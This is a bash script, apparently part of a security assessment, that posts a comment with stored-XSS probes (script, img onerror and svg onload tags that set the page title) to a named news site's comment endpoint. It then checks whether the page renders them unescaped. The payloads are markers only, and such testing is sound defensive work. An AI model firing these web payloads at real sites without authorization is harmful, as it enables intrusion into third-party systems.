#!/usr/bin/env bash
set -e
TARGET="https://www.thedownundernews.online"
SLUG="welcome-to-the-down-under-news"
EV=/home/research/Projects/DownUnderNewsz/evidence/phase3

echo "=== 1 POST comment with XSS probes ==="
curl -sS -k -D "$EV/comment-post-headers.txt" -o "$EV/comment-post.html" -w "status=%{http_code}\n" -m 15 \
  -X POST \
  -d "author_name=ClawSecTest" \
  -d "author_email=sec@example.com" \
  --data-urlencode "content=ClawSec probe <script>document.title='CMT_SCRIPT'</script> <img src=x onerror=\"document.title='CMT_IMG'\"> <svg onload=\"document.title='CMT_SVG'\"></svg>" \
  "$TARGET/article/$SLUG/comment"
echo "-- headers --"
cat "$EV/comment-post-headers.txt"

echo
echo "=== 2 GET article page to see rendered comment ==="
curl -sS -k -o "$EV/article-with-xss-comment.html" -w "status=%{http_code} size=%{size_download}\n" -m 15 "$TARGET/article/$SLUG"
echo "-- grep for ClawSec/raw tags/comment markers --"
grep -nE 'ClawSec|CMT_|<script|<img|<svg|onerror|onload|&lt;script|comment-item|comment-content' "$EV/article-with-xss-comment.html" | head -n 30 || echo "(no matches)"
